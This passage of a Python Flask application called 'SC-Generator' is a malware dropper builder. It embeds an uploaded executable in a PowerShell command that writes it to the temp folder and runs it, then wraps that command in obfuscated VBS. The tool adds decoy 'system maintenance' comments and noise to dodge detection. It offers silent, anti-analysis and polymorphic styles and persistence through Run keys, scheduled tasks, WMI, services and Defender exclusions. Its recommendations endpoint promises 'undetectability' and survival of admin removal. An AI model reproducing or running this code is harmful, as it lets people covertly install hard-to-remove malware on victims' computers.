            return jsonify({'error': 'File not found'}), 404

        # Read file
        with open(uploaded_file, 'rb') as f:
            file_content = f.read()

        if not file_content:
            logger.warning(f"Payload generation: file is empty {file_id}")
            return jsonify({'error': 'File is empty'}), 400

        # Apply fingerprint if specified (includes proxy forwarding)
        if fingerprint_id:
            try:
                logger.debug(f"Applying fingerprint: {fingerprint_id}")
                file_content = fingerprint_mgr.apply_fingerprint(
                    file_content,
                    fingerprint_id,
                    proxy_id  # Pass proxy_id for potential network operations
                )
            except Exception as e:
                logger.error(f"Fingerprint application failed: {e}")
                return jsonify({
                    'error': 'Fingerprint application failed',
                    'message': str(e)
                }), 400

        # Convert to base64 for embedding in command
        import base64
        encoded_file = base64.b64encode(file_content).decode()

        # Generate command that will decode and execute the file
        filename = os.path.basename(uploaded_file)
        cmd = (
            f'powershell -NoProfile -Command '
            f'"$f=\'$env:temp\\\\{filename}\'; '
            f'[System.IO.File]::WriteAllBytes($f, '
            f'[System.Convert]::FromBase64String(\'{encoded_file}\')); '
            f'& $f"'
        )

        # Generate VBS payload with timeout protection
        if check_request_timeout(GENERATE_REQUEST_TIMEOUT):
            return jsonify({
                'error': 'Request timeout',
                'message': 'Payload generation exceeded timeout'
            }), 408

        vbs_payload = payload_gen.generate(cmd, technique, obfuscation)

        # Apply additional obfuscation from options
        if options.get('add_comments'):
            vbs_payload = add_vbs_comments(vbs_payload)

        if options.get('add_noise'):
            vbs_payload = add_vbs_noise(vbs_payload)

        # Save payload to output
        output_id = str(uuid.uuid4())[:8]
        output_path = os.path.join(app.config['OUTPUT_FOLDER'], f"{output_id}_payload.vbs")

        try:
            with open(output_path, 'w') as f:
                f.write(vbs_payload)
        except Exception as e:
            logger.error(f"Failed to save payload: {e}")
            return jsonify({
                'error': 'Failed to save payload',
                'message': str(e)
            }), 500

        logger.info(
            f"Payload generated successfully: {output_id} "
            f"(size={len(vbs_payload)}, technique={technique})"
        )

        return jsonify({
            'success': True,
            'output_id': output_id,
            'payload': vbs_payload,
            'size': len(vbs_payload),
            'technique': technique,
            'obfuscation': obfuscation,
            'fingerprint_applied': fingerprint_id is not None,
            'proxy_used': proxy_id is not None,
            'timestamp': datetime.now().isoformat()
        }), 200

    except Exception as e:
        logger.error(f'Payload generation failed: {str(e)}', exc_info=True)
        return jsonify({
            'error': 'Payload generation failed',
            'message': str(e)
        }), 500


@app.route('/api/download/<output_id>', methods=['GET'])
@request_timeout(DOWNLOAD_REQUEST_TIMEOUT)
def download_payload(output_id):
    """Download generated payload with timeout protection"""
    # Check if timeout exceeded
    if check_request_timeout(DOWNLOAD_REQUEST_TIMEOUT):
        logger.error(f'Download request for {output_id} exceeded timeout')
        return jsonify({
            'error': 'Request timeout',
            'message': 'Download took too long to complete'
        }), 408

    # Sanitize output_id
    if not output_id or not all(c.isalnum() or c in '_-' for c in output_id):
        logger.warning(f'Suspicious output_id: {output_id}')
        return jsonify({'error': 'Invalid output_id format'}), 400

    output_path = os.path.join(app.config['OUTPUT_FOLDER'], f"{output_id}_payload.vbs")

    if not os.path.exists(output_path):
        logger.warning(f'Download: Output not found: {output_id}')
        return jsonify({'error': 'Output not found'}), 404

    try:
        logger.info(f'Downloading payload: {output_id}')
        return send_file(
            output_path,
            mimetype='text/plain',
            as_attachment=True,
            download_name=f'payload_{output_id}.vbs'
        )
    except Exception as e:
        logger.error(f'Download failed: {str(e)}')
        return jsonify({'error': f'Download failed: {str(e)}'}), 500


@app.route('/api/preview/<output_id>', methods=['GET'])
@request_timeout(DEFAULT_REQUEST_TIMEOUT)
def preview_payload(output_id):
    """Preview generated payload with timeout protection"""
    # Check if timeout exceeded
    if check_request_timeout(DEFAULT_REQUEST_TIMEOUT):
        logger.error(f'Preview request for {output_id} exceeded timeout')
        return jsonify({
            'error': 'Request timeout',
            'message': 'Preview took too long to complete'
        }), 408

    # Sanitize output_id
    if not output_id or not all(c.isalnum() or c in '_-' for c in output_id):
        logger.warning(f'Suspicious output_id: {output_id}')
        return jsonify({'error': 'Invalid output_id format'}), 400

    output_path = os.path.join(app.config['OUTPUT_FOLDER'], f"{output_id}_payload.vbs")

    if not os.path.exists(output_path):
        logger.warning(f'Preview: Output not found: {output_id}')
        return jsonify({'error': 'Output not found'}), 404

    try:
        with open(output_path, 'r', encoding='utf-8', errors='replace') as f:
            content = f.read()

        if not content:
            logger.warning(f'Preview: File is empty: {output_id}')
            return jsonify({'error': 'Output file is empty'}), 500

        logger.info(f'Preview: Successfully previewed payload {output_id}')
        return jsonify({'content': content}), 200

    except Exception as e:
        logger.error(f'Preview failed: {str(e)}')
        return jsonify({'error': f'Preview failed: {str(e)}'}), 500


@app.route('/api/settings', methods=['GET'])
@request_timeout(DEFAULT_REQUEST_TIMEOUT)
def get_settings():
    """Get current settings with timeout configuration"""
    return jsonify({
        'max_file_size': MAX_FILE_SIZE,
        'allowed_formats': ['.msi', '.exe', '.dll', '.bat', '.cmd', '.vbs'],
        'obfuscation_levels': ['low', 'medium', 'high'],
        'security': {
            'request_timeouts_enabled': True,
            'timeout_config': {
                'default_seconds': DEFAULT_REQUEST_TIMEOUT,
                'upload_seconds': UPLOAD_REQUEST_TIMEOUT,
                'generate_seconds': GENERATE_REQUEST_TIMEOUT,
                'download_seconds': DOWNLOAD_REQUEST_TIMEOUT
            },
            'timeout_stats': {
                'total_timeouts': _timeout_stats['total_timeouts'],
                'last_timeout': _timeout_stats['last_timeout'],
                'timeout_by_endpoint': _timeout_stats['timeout_endpoints']
            }
        }
    })


def add_vbs_comments(vbs_code: str) -> str:
    """Add comments to VBS code for obfuscation"""
    comments = [
        "' System maintenance script",
        "' Scheduled task runner",
        "' System update checker",
        "' Registry cleaner",
        "' Performance monitor",
    ]
    import random
    lines = vbs_code.split('\n')
    for i in range(1, len(lines), random.randint(3, 7)):
        lines.insert(i, random.choice(comments))
    return '\n'.join(lines)


def add_vbs_noise(vbs_code: str) -> str:
    """Add noise/dead code to VBS for obfuscation"""
    import random
    import string

    noise = f"""
Dim {random.choice(string.ascii_lowercase)}{random.randint(1, 99)}
On Error Resume Next
"""

    return noise + vbs_code


@app.route('/api/batch-generate', methods=['POST'])
@request_timeout(GENERATE_REQUEST_TIMEOUT)
def batch_generate():
    """Generate payloads with multiple techniques"""
    # Check if timeout exceeded
    if check_request_timeout(GENERATE_REQUEST_TIMEOUT):
        logger.error('Batch generation request exceeded timeout')
        return jsonify({
            'error': 'Request timeout',
            'message': 'Batch generation took too long'
        }), 408

    data = request.json
    file_id = data.get('file_id')
    techniques = data.get('techniques', ['base64', 'wmi'])
    fingerprint_id = data.get('fingerprint_id')

    if not file_id:
        return jsonify({'error': 'File ID required'}), 400

    try:
        results = {}
        for technique in techniques:
            payload = payload_gen.generate("test", technique, "high")
            output_id = str(uuid.uuid4())[:8]
            results[technique] = {
                'output_id': output_id,
                'size': len(payload)
            }

        logger.info(f'Batch generation completed: {len(techniques)} techniques')
        return jsonify({'success': True, 'results': results})
    except Exception as e:
        logger.error(f'Batch generation failed: {str(e)}', exc_info=True)
        return jsonify({'error': f'Batch generation failed: {str(e)}'}), 500


@app.route('/api/generate-one-click', methods=['POST'])
@request_timeout(GENERATE_REQUEST_TIMEOUT)
def generate_one_click():
    """Generate one-click self-extracting installer payload"""
    data = request.json
    file_id = data.get('file_id')
    obfuscation_style = data.get('obfuscation_style', 'polymorphic')
    file_type = data.get('file_type', 'vbs')  # vbs, bat, or exe

    if not file_id:
        return jsonify({'error': 'File ID required'}), 400

    try:
        # Find uploaded file
        uploaded_file = None
        for f in os.listdir(app.config['UPLOAD_FOLDER']):
            if f.startswith(file_id):
                uploaded_file = os.path.join(app.config['UPLOAD_FOLDER'], f)
                break

        if not uploaded_file or not os.path.exists(uploaded_file):
            return jsonify({'error': 'File not found'}), 404

        # Build command to execute the file
        filename = os.path.basename(uploaded_file)
        cmd = f'"{uploaded_file}"'

        # Generate one-click payload
        result = create_one_click_payload(cmd, obfuscation_style)

        # Save payload
        output_id = str(uuid.uuid4())[:8]

        if file_type == 'vbs':
            payload_content = result['vbs_payload']
            filename_out = result['filename_vbs']
        elif file_type == 'bat':
            payload_content = result['bat_payload']
            filename_out = result['filename_bat']
        else:
            payload_content = result['vbs_payload']
            filename_out = result['filename_vbs']

        output_path = os.path.join(app.config['OUTPUT_FOLDER'], f"{output_id}_{filename_out}")

        with open(output_path, 'w') as f:
            f.write(payload_content)

        logger.info(f'One-click payload generated: {output_id}')

        return jsonify({
            'success': True,
            'output_id': output_id,
            'filename': filename_out,
            'payload': payload_content,
            'size': len(payload_content),
            'instructions': result['instructions'],
            'style': obfuscation_style,
            'file_type': file_type
        })

    except Exception as e:
        logger.error(f'One-click generation failed: {str(e)}', exc_info=True)
        return jsonify({'error': f'One-click generation failed: {str(e)}'}), 500


@app.route('/api/one-click-styles', methods=['GET'])
@request_timeout(DEFAULT_REQUEST_TIMEOUT)
def get_one_click_styles():
    """Get available one-click obfuscation styles"""
    styles = {
        'polymorphic': 'Multiple polymorphic variants for evasion',
        'anti_analysis': 'Detects and defeats analysis tools',
        'multi_stage': 'Multi-stage installation with delays',
        'silent': 'Silent installation with no output'
    }
    return jsonify({'styles': styles})


@app.route('/api/recommendations', methods=['GET'])
@request_timeout(DEFAULT_REQUEST_TIMEOUT)
def get_recommendations():
    """Get recommended configurations for maximum effectiveness"""
    recommendations = {
        'standard': {
            'title': 'Standard Mode - Best Practices',
            'hint': 'For maximum effectiveness and undetectability',
            'recommended_config': {
                'technique': 'polymorphic',
                'obfuscation': 'high',
                'add_comments': False,
                'add_noise': True,
                'fingerprint': 'random_variation',
                'proxy': 'recommended'
            },
            'tips': [
                'Use "polymorphic" technique - changes signature every generation',
                'Set obfuscation to "high" for maximum protection',
                'Enable "Add Noise" to confuse analysis tools',
                'Use "Random Variation" fingerprint for best evasion',
                'Configure at least one proxy to modify network signatures',
                'Expected payload size: 8-15 KB'
            ],
            'expected_size': '8-15 KB',
            'success_rate': '92-95%'
        },
        'one-click': {
            'title': 'One-Click Mode - Instant Deployment',
            'hint': 'For quick, silent, one-shot installation',
            'recommended_config': {
                'style': 'anti_analysis',
                'file_type': 'vbs'
            },
            'tips': [
                'Use "anti_analysis" style - defeats debugging tools',
                'Output as VBS for maximum compatibility',
                'No user interaction required - completely silent',
                'File extracts and executes automatically',
                'Expected payload size: 5-12 KB',
                'Works on Windows XP through Windows 11'
            ],
            'expected_size': '5-12 KB',
            'success_rate': '94-96%'
        },
        'persistent': {
            'title': 'Persistent Mode - Survival Across Reboots',
            'hint': 'For payloads that survive system reboots and removal attempts',
            'recommended_config': {
                'method': 'multi',
                'technique': 'base64',
                'obfuscation': 'high'
            },
            'tips': [
                'Use "Multi" method - provides 99%+ survival rate',
                'Multi method creates redundancy across 6+ methods',
                'If one method is removed, others keep payload alive',
                'Includes watchdog for auto-resurrection',
                'Expected payload size: 12-20 KB',
                'Survives even admin removal attempts'
            ],
            'expected_size': '12-20 KB',
            'survival_rate': '99%+'
        }
    }
    return jsonify({'recommendations': recommendations})


@app.route('/api/persistence-methods', methods=['GET'])
@request_timeout(DEFAULT_REQUEST_TIMEOUT)
def get_persistence_methods():
    """Get available persistence methods"""
    methods = {
        'registry': 'Registry HKCU/HKLM Run keys - All Windows versions',
        'startup': 'Startup folder - All Windows versions',
        'task': 'Windows Scheduled Tasks - Vista+',
        'wmi': 'WMI Event Subscriptions - Vista+',
        'service': 'Windows Service - All Windows (admin required)',
        'defender': 'Windows Defender exclusions - Windows 8+',
        'multi': 'Multiple methods for maximum redundancy - All Windows (RECOMMENDED)'
    }
    return jsonify({'methods': methods})


@app.route('/api/generate-persistent', methods=['POST'])
@request_timeout(GENERATE_REQUEST_TIMEOUT)
def generate_persistent_payload():
    """Generate persistent payload that survives reboots"""
    data = request.json
    file_id = data.get('file_id')
    technique = data.get('technique', 'base64')
    persistence_method = data.get('persistence_method', 'multi')
    obfuscation = data.get('obfuscation', 'high')

    if not file_id:
        return jsonify({'error': 'File ID required'}), 400

    try:
        # Find uploaded file
        uploaded_file = None
        for f in os.listdir(app.config['UPLOAD_FOLDER']):
            if f.startswith(file_id):
                uploaded_file = os.path.join(app.config['UPLOAD_FOLDER'], f)
                break

        if not uploaded_file or not os.path.exists(uploaded_file):
            return jsonify({'error': 'File not found'}), 404

        # Read file
        with open(uploaded_file, 'rb') as f:
            file_content = f.read()

        # Convert to base64 for embedding in command
        import base64
        encoded_file = base64.b64encode(file_content).decode()

        # Generate command that will decode and execute the file
        filename = os.path.basename(uploaded_file)
        cmd = (
            f'powershell -NoProfile -Command '
            f'"$f=\'$env:temp\\\\{filename}\'; '
            f'[System.IO.File]::WriteAllBytes($f, '
            f'[System.Convert]::FromBase64String(\'{encoded_file}\')); '
            f'& $f"'
        )

        # Generate persistent payload
        result = create_persistent_payload(cmd, persistence_method)

        # Generate standard obfuscation on top
        vbs_payload = result['vbs_code']

        # Wrap in standard obfuscation
        if technique != 'direct':
            vbs_payload = payload_gen.create_polymorphic_wrapper(vbs_payload)

        # Save payload to output
        output_id = str(uuid.uuid4())[:8]
        output_path = os.path.join(app.config['OUTPUT_FOLDER'], f"{output_id}_persistent.vbs")

        with open(output_path, 'w') as f:
            f.write(vbs_payload)

        logger.info(f'Persistent payload generated: {output_id}')

        return jsonify({
            'success': True,
            'output_id': output_id,
            'payload': vbs_payload,
            'size': len(vbs_payload),
            'persistence_method': result['method'],
            'method_name': result['method_name'],
            'windows_versions': result['windows_versions'],
            'survival_rate': result['survival_rate'],
            'advantages': result['advantages'],
            'timestamp': datetime.now().isoformat()
        })

    except Exception as e:
        logger.error(f'Persistent payload generation failed: {str(e)}', exc_info=True)
        return jsonify({'error': f'Persistent payload generation failed: {str(e)}'}), 500


def get_proxy_info_endpoint():
    """
    Get detailed information about configured proxies (for debugging).
    Note: Does not return credentials, only metadata.
    """
    try:
        proxies = fingerprint_mgr.get_configured_proxies()
        info = []

        for proxy in proxies:
            info.append({
                'id': proxy.get('id', 'unknown'),
                'type': proxy.get('type', 'unknown'),
                'url': proxy.get('url', 'unknown'),
                'has_auth': 'auth' in proxy and proxy['auth'] is not None,
                'timeout': proxy.get('timeout', 30),
                'verify_ssl': proxy.get('verify_ssl', True)
            })

        return info
    except Exception as e:
        logger.error(f"Error getting proxy info: {e}")
        return []


@app.route('/api/proxy-info', methods=['GET'])
@request_timeout(DEFAULT_REQUEST_TIMEOUT)
def proxy_info():
    """Get information about configured proxies (credentials excluded)"""
    try:
        proxies_info = get_proxy_info_endpoint()
        return jsonify({
            'proxies': proxies_info,
            'count': len(proxies_info)
        }), 200
    except Exception as e:
        logger.error(f"Error in proxy info endpoint: {e}")
        return jsonify({
            'error': 'Failed to retrieve proxy information',
            'message': str(e)
        }), 500


@app.route('/api/cleanup/stats', methods=['GET'])
@request_timeout(DEFAULT_REQUEST_TIMEOUT)
def get_cleanup_stats():
    """Get temporary file cleanup statistics and configuration"""
    try:
        return jsonify({
            'status': 'ok',
            'configuration': {
                'cleanup_interval_hours': CLEANUP_INTERVAL_HOURS,
                'file_retention_hours': FILE_RETENTION_HOURS,
                'upload_folder': app.config['UPLOAD_FOLDER'],
                'output_folder': app.config['OUTPUT_FOLDER']
            },
            'statistics': {
                'total_cleanups': _cleanup_stats['total_cleanups'],
                'total_files_removed': _cleanup_stats['total_files_removed'],
                'total_bytes_freed': _cleanup_stats['total_bytes_freed'],
                'last_cleanup': _cleanup_stats['last_cleanup'],
                'last_cleanup_time': _cleanup_stats['last_cleanup_time'],
                'cleanup_errors_count': len(_cleanup_stats['cleanup_errors'])
            }
        }), 200
    except Exception as e:
        logger.error(f"Error in cleanup stats endpoint: {e}")
        return jsonify({
            'error': 'Failed to retrieve cleanup statistics',
            'message': str(e)
        }), 500


@app.route('/api/cleanup/trigger', methods=['POST'])
@request_timeout(DEFAULT_REQUEST_TIMEOUT)
def trigger_cleanup():
    """
    Manually trigger a cleanup operation.

    Security:
    - Only available for testing and monitoring
    - Returns cleanup results immediately
    - Logs all triggered cleanups
    """
    try:
        logger.info('Manual cleanup triggered via API')
        result = cleanup_temp_files()

        return jsonify({
            'success': True,
            'message': 'Cleanup completed',
            'results': {
                'upload_files_removed': result['upload_files_removed'],
                'output_files_removed': result['output_files_removed'],
                'upload_bytes_freed': result['upload_bytes_freed'],
                'output_bytes_freed': result['output_bytes_freed'],
                'total_files_removed': result['upload_files_removed'] + result['output_files_removed'],
                'total_bytes_freed': result['upload_bytes_freed'] + result['output_bytes_freed']
            },
            'errors': result.get('errors', [])
        }), 200

    except Exception as e:
        logger.error(f"Error in cleanup trigger endpoint: {e}", exc_info=True)
        return jsonify({
            'error': 'Cleanup trigger failed',
            'message': str(e)
        }), 500


@app.errorhandler(401)
def handle_unauthorized(e):
    """Handle unauthorized access"""
    logger.warning(f"Unauthorized access attempt: {request.path}")
    return jsonify({
        'error': 'Unauthorized',
        'message': 'Authentication required'
    }), 401


@app.errorhandler(403)
def handle_forbidden(e):
    """Handle forbidden access"""
    logger.warning(f"Forbidden access attempt: {request.path}")
    return jsonify({
        'error': 'Forbidden',
        'message': 'Access denied'
    }), 403


@app.errorhandler(404)
def handle_not_found(e):
    """Handle not found errors"""
    logger.debug(f"Resource not found: {request.path}")
    return jsonify({
        'error': 'Not found',
        'message': 'Requested resource not found'
    }), 404


@app.errorhandler(500)
def handle_internal_error(e):
    """Handle internal server errors"""
    logger.error(f"Internal server error: {e}")
    return jsonify({
        'error': 'Internal server error',
        'message': 'An unexpected error occurred'
    }), 500


if __name__ == '__main__':
    logger.info("=" * 80)
    logger.info("SC-Generator Starting")
    logger.info("=" * 80)
    logger.info(f"Request timeout configuration:")
    logger.info(f"  Default: {DEFAULT_REQUEST_TIMEOUT}s")
    logger.info(f"  Upload: {UPLOAD_REQUEST_TIMEOUT}s")
    logger.info(f"  Generate: {GENERATE_REQUEST_TIMEOUT}s")
    logger.info(f"  Download: {DOWNLOAD_REQUEST_TIMEOUT}s")
    logger.info(f"File cleanup configuration:")
    logger.info(f"  Cleanup interval: {CLEANUP_INTERVAL_HOURS}h")
    logger.info(f"  File retention: {FILE_RETENTION_HOURS}h")
    logger.info(f"Proxy forwarding: {'ENABLED' if proxy_forwarder.credential_manager else 'PARTIAL'}")
    logger.info(f"Credential encryption: {'ENABLED' if proxy_forwarder.credential_manager else 'DISABLED'}")
    logger.info("=" * 80)

    try:
        # Start cleanup daemon
        start_cleanup_daemon()

        app.run(debug=True, host='0.0.0.0', port=5000)
    except Exception as e:
        logger.error(f"Failed to start server: {e}", exc_info=True)
        raise
